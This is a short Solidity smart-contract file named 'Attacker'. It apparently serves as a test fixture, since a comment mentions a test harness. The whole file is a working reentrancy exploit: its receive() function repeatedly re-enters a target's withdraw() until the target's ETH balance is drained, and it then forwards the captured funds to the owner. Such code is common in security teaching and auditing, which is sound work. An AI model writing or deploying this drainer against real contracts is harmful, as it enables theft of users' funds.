// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
}

contract Attacker {
    IVulnerable public target;
    address owner;

    constructor(address _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    // Fallback function to hijack the flow of ether
    receive() external payable {
        // Re-enter the vulnerable contract
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value > 0, "Require positive ETH to attack");

        // Start the attack by depositing all supplied ETH
        target.deposit{value: msg.value}();

        // Withdraw the ether, which will trigger the re-entrancy
        target.withdraw();

        // Return all captured ETH to the owner/test harness.
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to get the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Helper function to send funds back to the owner
    function retrieve() public {
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
